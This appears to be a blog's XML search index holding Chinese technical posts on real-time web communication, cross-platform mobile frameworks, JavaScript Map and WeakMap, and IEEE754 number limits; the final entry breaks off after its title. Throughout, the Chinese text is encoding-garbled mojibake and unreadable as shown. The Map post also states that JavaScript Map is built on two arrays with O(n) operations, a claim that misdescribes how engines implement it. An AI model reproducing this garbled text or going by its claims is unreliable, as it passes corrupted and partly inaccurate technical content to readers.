<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[å®æ—¶é€šä¿¡æŠ€æœ¯]]></title>
    <url>%2F%E5%AE%9E%E6%97%B6%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[ç”±äºæµè§ˆå™¨çš„é™åˆ¶ï¼Œwebé€šä¿¡è¿‡ç¨‹éƒ½æ˜¯å®¢æˆ·ç«¯å…ˆå‘èµ·è¯·æ±‚ï¼ŒæœåŠ¡å™¨å†è¿›è¡Œå“åº”ã€‚å¦‚æœéœ€è¦åšåˆ°å³æ—¶é€šä¿¡ï¼ˆå³æœåŠ¡å™¨å¯ä»¥å°†æ•°æ®æ›´æ–°å®æ—¶æ¨é€åˆ°å®¢æˆ·ç«¯ï¼‰ï¼Œéœ€è¦å€ŸåŠ©å…¶ä»–æ–¹å¼è¿›è¡Œå®ç°ã€‚ç›®å‰å®ç° web å®æ—¶é€šä¿¡çš„æ–¹æ³•ä¸»è¦æœ‰å››ç§ï¼šè½®è¯¢ã€é•¿è½®è¯¢ã€é•¿é“¾æ¥(SSE)ã€websocketã€‚æ€»ä½“ä¸Šå¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼Œä¸€ç±»æ˜¯åŸºäº http å®ç°çš„ï¼Œå¦‚è½®è¯¢ã€é•¿è½®è¯¢ã€SSEï¼Œå¦ä¸€ç±»ä¸æ˜¯åŸºäº http å®ç°çš„ã€‚å³ websocketã€‚ è½®è¯¢ï¼ˆçŸ­è½®è¯¢ï¼‰çŸ­è½®è¯¢çš„å®ç°æ–¹å¼å¾ˆç®€å•ï¼Œå°±æ˜¯ä¸æ–­çš„å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼Œè¯¢é—®æœåŠ¡å™¨æœ‰æ²¡æœ‰æ–°çš„èµ„æºï¼Œæ˜¾ç„¶æµªè´¹å¾ˆå¤šçš„ç½‘ç»œèµ„æºã€æœåŠ¡å™¨èµ„æºå’Œå®¢æˆ·ç«¯èµ„æºã€‚æ¯æ¬¡è¯·æ±‚éƒ½éœ€è¦å»å»ºç«‹é“¾æ¥ï¼Œäººæ•°è¶Šå¤šï¼ŒæœåŠ¡å™¨çš„å‹åŠ›è¶Šå¤§ã€‚ é•¿è½®è¯¢é•¿è½®è¯¢å³ï¼šå®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ï¼ŒæœåŠ¡å™¨å°†è¯·æ±‚ hold ä¸»ï¼Œç›´åˆ°æœ‰æ–°çš„èµ„æºæˆ–è€… timeout æ‰è¿›è¡Œè¿”å›ï¼Œè¿”å›åæ–­å¼€é“¾æ¥ã€‚ç›¸æ¯”äºçŸ­è½®è¯¢ï¼Œå¯ä»¥èŠ‚çœä¸å°‘èµ„æºã€‚ä½†æ˜¯æœåŠ¡å™¨ä¹Ÿéœ€è¦ç»´æŒä¸€ä¸ªæŒ‚èµ·é“¾æ¥ï¼Œä¹Ÿä¼šæ¶ˆè€—èµ„æºï¼Œå¹¶ä¸”é‡æ–°å‘èµ·è¯·æ±‚ä¾ç„¶éœ€è¦é‡æ–°å»ºç«‹é“¾æ¥ã€‚ é•¿é“¾æ¥(SSE)é•¿é“¾æ¥ä¸é•¿è½®è¯¢çš„ä¸»è¦å·®åˆ«åœ¨äºå®¢æˆ·ç«¯åªéœ€è¦å‘èµ·ä¸€ä¸ªé“¾æ¥ï¼Œåç»­æœåŠ¡ç«¯æœ‰æ•°æ®æ›´æ–°ï¼Œä¼šæºæºä¸æ–­çš„ä»æœåŠ¡ç«¯å‘é€è¿‡æ¥ï¼Œä¸éœ€è¦æ¯æ¬¡è¯·æ±‚éƒ½å»ºç«‹èµ·é“¾æ¥ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒæœåŠ¡ç«¯å•æ–¹é¢æ¨é€ï¼Œå¹¶ä¸æ˜¯å…¨åŒå·¥çš„è¿‡ç¨‹ã€‚ websocketä¸‹æ–‡æ‘˜è‡ªç»´åŸºç™¾ç§‘ websocket æ˜¯ä¸€ç§åœ¨å•ä¸ª TCP é“¾æ¥ä¸Šè¿›è¡Œå…¨åŒå·¥é€šä¿¡çš„åè®®ã€‚åœ¨ websocket API ä¸­ï¼Œæµè§ˆå™¨å’ŒæœåŠ¡å™¨åªéœ€è¦å®Œæˆä¸€æ¬¡æ¡æ‰‹ï¼Œä¸¤è€…ä¹‹é—´å°±ç›´æ¥å¯ä»¥åˆ›å»ºæŒä¹…è¿æ¥ï¼Œå¹¶è¿›è¡ŒåŒå‘æ•°æ®ä¼ è¾“ã€‚ä¼˜ç‚¹ï¼š è¾ƒå°‘çš„æ§åˆ¶å¼€é”€ã€‚åœ¨åˆ›å»ºé“¾æ¥åï¼ŒæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´äº¤æ¢æ•°æ®æ—¶ï¼Œç”¨äºåè®®æ§åˆ¶çš„æ•°æ®åŒ…å¤´éƒ¨ç›¸å¯¹è¾ƒå°ã€‚ æ›´å¼ºçš„å®æ—¶æ€§ã€‚ç”±äºåè®®æ˜¯å…¨åŒå·¥çš„ï¼Œæ‰€ä»¥æœåŠ¡å™¨å¯ä»¥éšæ—¶ä¸»åŠ¨ç»™å®¢æˆ·ç«¯ä¸‹å‘æ•°æ®ã€‚ ä¿æŒè¿æ¥çŠ¶æ€ã€‚ä¸ HTTP ä¸åŒçš„æ˜¯ï¼Œwebsocket éœ€è¦å…ˆåˆ›å»ºè¿æ¥ï¼Œè¿™å°±ä½¿å¾—å…¶æˆä¸ºä¸€ç§æœ‰çŠ¶æ€çš„åè®®ï¼Œä¹‹åçš„é€šä¿¡æ—¶å¯ä»¥çœç•¥éƒ¨åˆ†çŠ¶æ€ä¿¡æ¯ã€‚è€ŒHTTPè¯·æ±‚å¯èƒ½éœ€è¦åœ¨æ¯ä¸ªè¯·æ±‚éƒ½æºå¸¦çŠ¶æ€ä¿¡æ¯ï¼ˆå¦‚èº«ä»½è®¤è¯ï¼‰ æ›´å¥½çš„æ”¯æŒäºŒè¿›åˆ¶ã€‚websocket å®šä¹‰äº†äºŒè¿›åˆ¶å¸§ï¼Œç›¸å¯¹ HTTPï¼Œå¯ä»¥æ›´è½»æ¾åœ°å¤„ç†äºŒè¿›åˆ¶å†…å®¹ å¯ä»¥æ”¯æŒæ‰©å±•ã€‚websocket åè®®å®šä¹‰äº†æ‰©å±•ï¼Œç”¨æˆ·å¯ä»¥æ‰©å±•åè®®ã€å®ç°éƒ¨åˆ†è‡ªå®šä¹‰çš„å­åè®®ã€‚ æ›´å¥½çš„å‹ç¼©æ•ˆæœã€‚ç›¸å¯¹äº HTTP å‹ç¼©ï¼Œwebsocket åœ¨é€‚å½“çš„æ‰©å±•ä¸‹ï¼Œå¯ä»¥æ²¿ç”¨ä¹‹å‰å†…å®¹çš„ä¸Šä¸‹æ–‡ï¼Œåœ¨ä¼ é€’ç±»ä¼¼çš„æ•°æ®æ—¶ï¼Œå¯ä»¥æ˜¾è‘—çš„æé«˜å‹ç¼©ç‡ æœ€åï¼Œè¿™é‡Œåªæ˜¯çºªå½•ä¸€äº›çŸ¥è¯†ç‚¹ï¼Œä¾›åç»­å­¦ä¹ ä½¿ç”¨ã€‚]]></content>
      <categories>
        <category>websocket</category>
      </categories>
      <tags>
        <tag>è½®è¯¢</tag>
        <tag>é•¿è½®è¯¢</tag>
        <tag>é•¿é“¾æ¥</tag>
        <tag>websocket</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¤šç«¯å…±äº«å®ç°]]></title>
    <url>%2F%E5%A4%9A%E7%AB%AF%E5%85%B1%E4%BA%AB%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[é¦–å…ˆè®©æˆ‘ä»¬æ€è€ƒä¸€ä¸ªé—®é¢˜ï¼Œä½ è§‰å¾—å„ä¸ªå¹³å°æ˜¯å¦å¸Œæœ›è‡ªå·±çš„ç”Ÿæ€è¢«æ‰“ç ´ï¼Œä¸åŒå¹³å°çš„ç‰¹æ€§æ˜¯å¦åº”è¯¥å½’ä¸ºä¸€è‡´ï¼Ÿç­”æ¡ˆæ˜¾ç„¶æ˜¯å¦å®šçš„ï¼Œæ¯ä¸ªå¤§çš„ä¼ä¸šéƒ½å¸Œæœ›åœˆèµ·è‡ªå·±çš„ä¸€ä¸ªç”Ÿæ€åœˆã€‚é‚£ä¹ˆè·¨å¹³å°çš„æ–¹æ¡ˆæœ€ç»ˆéƒ½éœ€è¦é¢å¯¹å„ä¸ªå¹³å°é—´å·®å¼‚æ€§çš„é—®é¢˜ï¼Œè¿™ç§å·®å¼‚æ€§å¯¼è‡´å†™ä¸€æ¬¡åˆ°å¤„è·‘çš„æ„¿æ™¯å‡ ä¹è½ç©ºã€‚ä¸ºä»€ä¹ˆè¯´æ˜¯å‡ ä¹å‘¢ï¼ŸæŠ€æœ¯çš„å‘å±•è·¯çº¿è°ä¹Ÿè¯´ä¸ä¸Šï¼Œä¹Ÿè®¸å°†æ¥ä¼šå‡ºç°åˆ’æ—¶ä»£çš„æŠ€æœ¯ã€‚Flutter å¯èƒ½å°±æ˜¯è¿™æ–¹é¢çš„é¼»ç¥–ã€‚ ç›®å‰è·¨å¹³å°è§£å†³æ–¹æ¡ˆç›®å‰å¸‚é¢ä¸Šè·¨å¹³å°çš„è§£å†³æ–¹æ¡ˆå¤§è‡´ä¸Šå¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼š ä½¿ç”¨å¹³å°æ”¯æŒçš„ web æŠ€æœ¯ï¼šè¿™äº›è§£å†³æ–¹æ¡ˆåŸºæœ¬ä¸ŠåŠ è½½äº†åº”ç”¨ç¨‹åºä¸­çš„ç§»åŠ¨æµè§ˆå™¨ï¼Œå¹¶åœ¨æ”¹æµè§ˆå™¨ä¸­æ‰§è¡Œæ‰€æœ‰çš„é€»è¾‘ã€‚å¦‚ PhoneGapã€‚ æœ¬åœ°è·¨å¹³å°ï¼šç¨‹åºå‘˜ç¼–å†™çš„ codeï¼Œå¯ä»¥è‡ªåŠ¨è½¬æ¢ä¸º Native ä»£ç ã€‚è¿™ç§æ–¹å¼çš„ä¼˜ç‚¹æ˜¯è¿‘ä¹åŸç”Ÿçš„æ€§èƒ½ï¼Œå¦‚ RNã€weex ç­‰ã€‚ RNã€weex ç°åœ¨è™½ç„¶æœ‰äº†æ¯”è¾ƒå¤§çš„ç”Ÿæ€ï¼Œç›®å‰ä¹Ÿé€æ­¥è¢«å¤§å…¬å¸æŠ›å¼ƒã€‚å¹³å°çš„å·®å¼‚æ€§å¤ªå¤§ï¼Œé‡Œé¢æœ‰å¤ªå¤šçš„å‘éƒ½å¾ˆéš¾ç»•è¿‡å»ã€‚æœ‰æ—¶å€™æ’æŸ¥ä¸€ä¸ªé—®é¢˜éœ€è¦æ·±å…¥äº†è§£ Android å’Œ IOSã€‚åŒæ—¶ç†ŸçŸ¥ Android å’Œ IOS è¿˜æœ‰ RN ç­‰è¯­è¨€çš„äººæ‰ï¼Œå¸‚åœºä¸Šä¹Ÿæ²¡å¤šå°‘ä¸ªã€‚ å¥½æ¶ˆæ¯æ˜¯ FB è¯´å‡†å¤‡å¯¹ react-native é‡æ„ï¼Œæœªæ¥ä¼šæ›´å¥½ğŸŒ¹ FlutterFlutter æ˜¯ google æœ€è¿‘æ¨å‡ºçš„è·¨å¹³å°å¼€å‘æ¡†æ¶ã€‚å¯ä»¥å¿«é€Ÿåœ¨ IOSã€Androidã€Fuchsiaä¸Šæ„å»ºé«˜è´¨é‡çš„åŸç”Ÿç”¨æˆ·ç•Œé¢ã€‚é‚£ä¹ˆ Flutter æ˜¯æ€ä¹ˆè§£å†³è·¨å¹³å°çš„é—®é¢˜çš„å‘¢ï¼Ÿ Flutter è·¨å¹³å°æœ€æ ¸å¿ƒçš„éƒ¨åˆ†æ˜¯å®ƒçš„é«˜æ€§èƒ½æ¸²æŸ“å¼•æ“ï¼ˆFlutter Engineï¼‰ã€‚Flutter ä¸ä½¿ç”¨æµè§ˆå™¨æŠ€æœ¯ï¼Œä¹Ÿä¸ä½¿ç”¨ Native çš„åŸç”Ÿæ§ä»¶ï¼Œå®ƒä½¿ç”¨è‡ªå·±çš„æ¸²æŸ“å¼•æ“æ¥ç»˜åˆ¶ widgetã€‚ å°ç¨‹åºé¦–å…ˆæ˜¯å¹³å°ä¸ºå°ç¨‹åºæä¾›äº†å®Œæ•´çš„åŸºç¡€åº“ï¼Œé€šè¿‡åŸºç¡€åº“ã€åŒçº¿ç¨‹æ¸²æŸ“ç­‰æ–¹å¼ï¼Œæå‡äº†å°ç¨‹åºå¯åŠ¨çš„ä½“éªŒã€‚ å°ç¨‹åºä¹Ÿæ˜¯é€šè¿‡ Webview + åŸç”Ÿç»„ä»¶å®ç°çš„ã€‚ä¸ä¼ ç»Ÿ webview ä¸åŒçš„æ˜¯ï¼Œå°ç¨‹åºå°†é‡‡ç”¨åŒçº¿ç¨‹æ¸²æŸ“ï¼Œå°†å–§åš·å±‚å’Œé€»è¾‘å±‚åˆ†å¼€ã€‚ é€»è¾‘å±‚ï¼šåˆ›å»ºä¸€ä¸ªå•ç‹¬çš„çº¿ç¨‹å»æ‰§è¡Œ jsï¼Œåœ¨è¿™ä¸ªç¯å¢ƒä¸‹æ‰§è¡Œçš„éƒ½æ˜¯æœ‰å…³å°ç¨‹åºä¸šåŠ¡é€»è¾‘çš„ä»£ç ã€‚ æ¸²æŸ“å±‚ï¼šç•Œé¢æ¸²æŸ“ç›¸å…³çš„ä»»åŠ¡éƒ½åœ¨ webview çº¿ç¨‹ä¸Šæ‰§è¡Œï¼Œé€šè¿‡é€»è¾‘å±‚çš„ä»£ç å»æ§åˆ¶æ¸²æŸ“é‚£äº›é¡µé¢ã€‚ä¸€ä¸ªå°ç¨‹åºå­˜åœ¨å¤šä¸ªé¡µé¢ï¼Œæ‰€ä»¥æ¸²æŸ“å±‚å­˜åœ¨å¤šä¸ª webview çº¿ç¨‹ã€‚ è¿™ä¹ˆè®¾è®¡çš„ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢å¼€å‘è€…ä½¿ç”¨ä¸€äº›æµè§ˆå™¨æä¾›çš„æ¥å£ï¼Œä¾‹å¦‚ï¼šé¡µé¢è·³è½¬ã€æ“ä½œDOMã€åŠ¨æ€æ‰§è¡Œè„šæœ¬ã€‚å¯ä»¥é¿å…å¤§éƒ¨åˆ†åœ¨æµè§ˆå™¨ä¸­çš„å®‰å…¨æ€§é—®é¢˜ã€‚ é€»è¾‘å±‚å’Œæ¸²æŸ“å±‚çš„é€šä¿¡ä¼šç”± Native(å¾®ä¿¡å®¢æˆ·ç«¯) åšä¸­è½¬ï¼Œé€»è¾‘å±‚å‘é€ç½‘ç»œè¯·æ±‚ä¹Ÿç»ç”± Native è½¬å‘ã€‚]]></content>
      <categories>
        <category>native</category>
      </categories>
      <tags>
        <tag>react-native</tag>
        <tag>Flutter</tag>
        <tag>å°ç¨‹åº</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js Map å’Œ WeakMap]]></title>
    <url>%2FMap%20%E5%92%8C%20WeakMap%2F</url>
    <content type="text"><![CDATA[TL;DR ç›¸æ¯”å­—é¢é‡å¯¹è±¡ï¼ŒMap çš„ key å¯ä»¥æ˜¯ä»»æ„ç±»å‹ ç›¸æ¯”å­é¢é‡å¯¹è±¡ï¼ŒMap å¯ç›´æ¥é€šè¿‡è¿›è¡Œéå†ï¼Œéå†çš„é¡ºåºä¸ºkey`value`æ’å…¥çš„é¡ºåº Map å¯ä»¥æ–¹ä¾¿çš„å¯¹å­å…ƒç´ è¿›è¡Œå¢åˆ æ”¹æŸ¥ï¼Œå†…éƒ¨å­˜å‚¨å…¶å®ä¸ºæ•°ç»„ç±»å‹ï¼ŒåŸºæœ¬æ“ä½œçš„æ—¶é—´å¤æ‚åº¦ä¸º n WeakMap é”®å¿…é¡»æ˜¯å¯¹è±¡ï¼Œä¸ºå¯¹è±¡çš„å¼±å¼•ç”¨ï¼Œåœ¨æŸäº›åœºæ™¯ä¸‹å¯æ–¹ä¾¿çš„é¿å…å†…å­˜æ³„æ¼ Mapåœ¨ javascript é‡Œï¼ŒMap ç»“æœæ˜¯é€šè¿‡ä¸¤ä¸ªæ•°ç»„å®ç°çš„ï¼Œä¸€ä¸ªå­˜æ”¾ keyï¼Œä¸€ä¸ªå­˜æ”¾ valueï¼Œè¿™å°±è§£æä¸ºä»€ä¹ˆ Map ç»“æ„æ˜¯å¯éå†çš„ï¼Œéå†çš„é¡ºåºä¹Ÿæ˜¯å¯ä»¥ä¿è¯çš„ï¼ˆå³ä¸ºé”®å€¼å¯¹æ’å…¥çš„é¡ºåºï¼‰ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä»»æ„ç±»å‹ä½œä¸º keyã€‚ä½†æ˜¯è¿™æ ·ä¼šå¯¼è‡´ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ Map ç»“æ„çš„å¢åˆ æ”¹æŸ¥çš„æ—¶é—´å¤æ‚åº¦éƒ½æ˜¯O(n)ï¼Œå¦å¤–ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¯èƒ½ä¼šå¯¼è‡´å†…å­˜æ³„æ¼ã€‚ç¨åæˆ‘ä»¬åˆ†æ WeakMap æ—¶ä¼šè¿›è¡Œè¯¦ç»†åˆ†æã€‚ é‚£ä¹ˆæˆ‘ä»¬ä»€ä¹ˆæ—¶å€™ä½¿ç”¨ Mapï¼Œä»€ä¹ˆæ—¶å€™ä½¿ç”¨å¯¹è±¡å­—é¢é‡å‘¢ï¼Ÿ å¦‚æœéœ€è¦å°†åŸå§‹å€¼å­˜å‚¨ä¸ºé”®ï¼Œåˆ™ä½¿ç”¨ Mapã€‚Object ä¼šå°†é”®è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ éœ€è¦å¯¹å¯¹è±¡å±æ€§è¿›è¡Œå¢åˆ æ—¶ä½¿ç”¨ Mapã€‚Object è¿›è¡Œå…ƒç´ çš„åˆ é™¤æ—¶ä¼šå¸¦æ¥ç›¸å¯¹å¤§çš„æ€§èƒ½æŸå¤±ã€‚ å¦‚æœ key åœ¨ç¨‹åºè¿è¡Œæ—¶æ‰èƒ½çŸ¥é“(å¯èƒ½ä¸æ˜¯ String)ï¼Œä½¿ç”¨ Mapï¼Œä½¿ç”¨ Object å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›æ„æƒ³ä¸åˆ°çš„é—®é¢˜ã€‚ WeakMapå‰é¢æˆ‘ä»¬æåˆ°è¿‡ï¼ŒWeakMap çš„é”®åªèƒ½æ˜¯å¯¹è±¡ï¼Œå¹¶ä¸”åªæ˜¯å¯¹è±¡çš„å¼±å¼•ç”¨ã€‚æ€ä¹ˆç†è§£å‘¢ï¼Ÿ å€Ÿç”¨é˜®ä¸€å³°è€å¸ˆçš„è¯: WeakMap ä¸­é”®éƒ½æ˜¯å¼±å¼•ç”¨ï¼Œå³åƒåœ¾å›æ”¶æœºåˆ¶ä¸ä¼šè€ƒè™‘ WeakMap å¯¹æ”¹å¯¹è±¡çš„å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœå…¶ä»–å¯¹è±¡éƒ½ä¸åœ¨å¼•ç”¨è¯¥å¯¹è±¡ï¼Œé‚£ä¹ˆåƒåœ¾å›æ”¶æœºåˆ¶å°±ä¼šè‡ªåŠ¨å›æ”¶æ”¹å¯¹è±¡å ç”¨çš„å†…å­˜ã€‚ä¸è€ƒè™‘æ”¹å¯¹è±¡æ˜¯å¦è¿˜å­˜å‚¨åœ¨ WeakMap ä¸­ã€‚ å› ä¸º Map ç»“æ„çš„æ•°ç»„ä¼šä¸€ç›´å¼•ç”¨ç€æ¯ä¸ª key å’Œ valueã€‚è¿™ç§å¼•ç”¨ä½¿å¾—åƒåœ¾å›æ”¶ç®—æ³•ä¸èƒ½å›æ”¶å¤„ç†å®ƒä»¬ï¼Œå³æ˜¯è¿™äº›å¯¹è±¡æ²¡æœ‰å…¶ä»–åœ°æ–¹åœ¨å¼•ç”¨ã€‚ ä¹Ÿæ­£æ˜¯ç”±äºè¿™æ ·çš„å¼±å¼•ç”¨ï¼ŒWeakMap æ˜¯ä¸å¯æšä¸¾çš„ã€‚å¦‚æœ key æ˜¯å¯ä»¥æšä¸¾çš„ï¼Œå…¶åˆ—è¡¨å°†ä¼šå—åˆ°åƒåœ¾å›æ”¶æœºåˆ¶çš„å½±å“ï¼ˆå› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“åƒåœ¾å›æ”¶æœºåˆ¶ä»€ä¹ˆæ—¶å€™å¯¹æ²¡æœ‰å¼•ç”¨çš„å¯¹è±¡è¿›è¡Œå›æ”¶ï¼‰ï¼Œä»è€Œå¾—åˆ°ä¸ç¡®å®šæ€§ç»“æœã€‚ å‚è€ƒ é˜®ä¸€å³°es6-WeakMap WeakMapçš„å­¦ä¹ å’Œä½¿ç”¨ MDN WeakMap MDN Map]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>Map</tag>
        <tag>WeakMap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js Numberè¯¦è§£]]></title>
    <url>%2Fjs%20Number%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[TL;DR Number æœ€å¤§å®‰å…¨æ•´æ•°ä¸º Math.pow(2, 53) - 1 Number.MAX_VALUE round æˆ Infinity è‡³å°‘åŠ ä¸Šèƒ½è¢«å››èˆäº”å…¥åˆ° Math.pow(2, 970) ä½è¿ç®—ç¬¦å¤„ç†æ•°æ®ä¹‹å‰éœ€è¦è½¬æ¢ä¸º32ä½è¿›è¡Œå¤„ç†ï¼Œå¤„ç†å®Œåå†è½¬æ¢ä¸º 64 ä½ æ–‡ç« æ€è·¯ æè¿° IEEE754 64åŒç²¾åº¦è¡¨ç¤ºæ³• æ¨å‡º Infinityã€Number.MAX_VALUEã€Number.MIN_VALUE çš„è¡¨è¿° è¿›ä¸€æ­¥æ¨å‡º Number çš„æœ€å¤§å®‰å…¨æ•°è¡¨ç¤ºï¼Œä¸ºä»€ä¹ˆæ˜¯ Math.pow(2, 53) - 1 åˆ†æä½è¿ç®— 32 ä½è½¬æ¢ï¼Œå¦‚ä½•å°† 64 ä½è½¬æ¢æˆ 32 ä½ IEEE754 åŒç²¾åº¦è¡¨ç¤ºæ ¹æ® IEEE754 æ ‡å‡†è§„å®šï¼Œä¸€ä¸ªåŒç²¾åº¦æµ®ç‚¹æ•°å¯ä»¥è¡¨ç¤ºä¸º: value = ç¬¦å·ä½(S) x å°¾æ•°(M) x Math.pow(2, E) S ç¬¦å·ä½ï¼Œå†³å®šæ•°å­—çš„æ­£è´Ÿ M å°¾æ•°ä½ï¼Œ1 &lt;= M &lt; 2 E è¡¨ç¤ºæ•°å­—æŒ‡æ•° åœ¨å†…å­˜ä¸­çš„è¡¨ç¤ºå¦‚ä¸‹ï¼š sign 1 ä½ï¼Œexponent 11 ä½ï¼Œsignificand 52 ä½ S è¡¨ç¤ºç¬¦å·ä½ï¼Œ0 ä¸ºæ­£ï¼Œ1 ä¸ºè´Ÿ exponent ä¸æ˜¯å…¬å¼ä¸­ Math.pow(2, E) ä¸­çš„ Eï¼ŒäºŒæ˜¯ E + 1023 å‰é¢æåˆ°ï¼Œ1 &lt;= M &lt; 2ï¼Œå¯ä»¥è¡¨ç¤º 1.xxxxxxï¼Œå…¶ä¸­ xxxxxxx å³æ˜¯ç”¨ significand å­˜å‚¨ å‚è€ƒ IEEE754 IEEE754 å¯è§†åŒ– Infinityã€0ã€MAX_VALUEã€MIN_VALUEIEEE754 æ ‡å‡†è§„å®šï¼Œexponent å…¨1å’Œå…¨0éƒ½æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œä¸ç®—æ­£å¸¸æŒ‡æ•°ã€‚ å…¨0ï¼šç”¨æ¥è¡¨ç¤ºå¸¦ç¬¦å·çš„ 0ï¼ˆå°¾æ•°ä¸º0ï¼‰æˆ–ä¸‹æº¢æ•°ï¼ˆå°¾æ•°ä¸ä¸º0ï¼‰ å…¨1ï¼šç”¨æ¥è¡¨ç¤ºInifinityï¼ˆå°¾æ•°ä¸º0ï¼‰æˆ– NaN ï¼ˆå°¾æ•°ä¸ä¸º0ï¼‰ å…¶ä»–ï¼šä»£è¡¨ Math.pow(2, e)ï¼Œå…¶ä¸­ -1022 &lt;= e &lt;= 1023ï¼Œå› ä¸º -1023 å’Œ 1024 å·²æœ‰ç‰¹æ®Šå«ä¹‰ ç”±æ­¤å¯çŸ¥:12345// æ— ç©·å¤§Math.pow(2, 1024) === Inifity// 0ï¼Œå› ä¸º eæœ€å°ä¸º -1022ï¼ŒæŠŠé»˜è®¤çš„ 1 å†å·¦ç§» 53 ä½ï¼Œå°¾æ•°å³ä¸º 0Math.pow(2, -1022) * Math.pow(2, -53) === 0 ç”±æ­¤å¯è½»æ˜“æ¨æ–­å‡ºï¼ŒMIN_VALUE å’Œ MAX_VALUE123456// MIN_VALUE ä¸ºï¼šæœ€å°æŒ‡æ•° x æœ€å°å°¾æ•°Number.MIN_VALUE === Math.pow(2ï¼Œ-1022) * Math.pow(2, -52);// MAX_VALUE ä¸ºï¼šæœ€å¤§æŒ‡æ•° x æœ€å¤§å°¾æ•°Number.MAX_VALUE === Math.pow(2, 1023) * 1.xxxxxx === Math.pow(2, 971) * (Math.pow(2, 53) - 1) // å°†å°¾æ•°å³ç§» 52 ä½ æ‰€ä»¥ Infinity å’Œ Number.MAX_VALUE ä¸æ˜¯ä¸€ä¸ªæ•°é‡çº§çš„ã€‚Infinity æ¯” Number.MAX_VALUE å¤šäº†Math.pow(2, 971)ã€‚Number.MAX_VALUE åªæœ‰åœ¨ significand å¤šä¸€ä¸ªæ¯”ç‰¹ä½æ‰ä¼šè¢«è¡¨ç¤ºä¸º Infinity1(Math.pow(2, 54) - 1) * Math.pow(2, 970) - (Math.pow(2, 53) -1) * Math.pow(2, 971) === Math.pow(2, 970) ä¹Ÿå°±æ˜¯è¯´ï¼ŒNumber.MAX_VALUE å¿…é¡»è¦åŠ ä¸Šä¸€ä¸ªè¢« IEEE754 å››èˆäº”å…¥ä¸º Math.pow(2, 970) çš„æ•°ï¼Œæ‰èƒ½è¢«è½¬æ¢ä¸º Infinity Number.MAX_SAFE_INTEGERjavascript çš„æœ€å¤§å®‰å…¨æ•°ä¸º Number.MAX_SAFE_INTEGERï¼Œå³ï¼š1Math.pow(2, 53) - 1 === Number.MAX_SAFE_INTEGER ä¸ºä»€ä¹ˆ Math.pow(2, 53) - 1 æ‰æ˜¯æœ€å¤§å®‰å…¨æ•´æ•°å‘¢ï¼Ÿ IEEE754 è¦æ±‚æµ®ç‚¹æ•°ä»¥è§„èŒƒå½¢å¼å­˜å‚¨ï¼Œå³å°æ•°ç‚¹å‰æœ‰ä¸€ä½éé›¶æ•°å­—ã€‚å¯¹äºäºŒè¿›åˆ¶æ•°ï¼Œéé›¶æ•°å­—åªæœ‰ 1ã€‚æ‰€ä»¥IEEE754åœ¨å­˜å‚¨æ—¶çœç•¥äº†è¿™ä¸ªå°æ•°ç‚¹å‰é¢çš„1ï¼Œåªå­˜å‚¨å°æ•°ç‚¹åé¢çš„ä½ã€‚å‰é¢æˆ‘ä»¬è¯´è¿‡ï¼Œsignificand æ€»å…±æœ‰ 52 ä½ï¼ŒåŠ ä¸Šéšè—çš„ä¸€ä½1ï¼Œæ€»å…±æœ‰ 53 ä½è¡¨ç¤ºçš„äºŒè¿›åˆ¶æ•°ï¼Œåœ¨å¤šçš„ä¼šè¢«æˆªæ–­ï¼Œä¹Ÿå°±æ˜¯ç²¾è¯»ä¸¢å¤±ã€‚é‚£ä¹ˆæœ€å¤§çš„æ•´æ•°å³æ˜¯ 53 ä½ 1ï¼Œä½ Math.pow(2, 53) - 1ã€‚ ä¸ºä»€ä¹ˆä¸æ˜¯ Math.pow(2, 53) å‘¢ï¼Ÿå› ä¸º Math.pow(2, 53) åé¢å…¨æ˜¯ 0ï¼Œæˆªæ–­ä¹Ÿæ²¡å…³ç³»å‘€ï¼Ÿ å°±æ˜¯å› ä¸ºæœ‰æˆªæ–­è¿™ä¸ªåŠ¨ä½œï¼Œæ‰€ä»¥ Math.pow(2, 53) === Math.pow(2, 53) + 1ï¼Œé‚£ä¹ˆ Math.pow(2, 53) å°±æ˜¯ä¸å®‰å…¨çš„ã€‚â€œå®ƒå¯ä»¥è¢«ä¸å®‰å…¨çš„æ•°è¡¨ç¤ºâ€ ä½è¿ç®—JS åœ¨å°†ä¸¤ä¸ªæ•´æ•°è¿›è¡Œä½è¿ç®—æ—¶ï¼Œä¼šå…ˆè‡ªåŠ¨è½¬æ¢ä¸º32ä½æœ‰ç¬¦å·æ•´æ•°ï¼Œå®Œæˆåå†å°†ç»“æœè½¬æ¢ä¸º64ä½ã€‚å†è½¬æ¢ä¸º32ä½æ—¶ï¼Œé«˜å­èŠ‚å°†ä¼šè¢«æˆªæ–­ã€‚ æŒ‰ä½æ“ä½œç¬¦;]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>number</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é‡æ–°è®¤è¯†requestAnimationFrame]]></title>
    <url>%2F%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86requestAnimationFrame%2F</url>
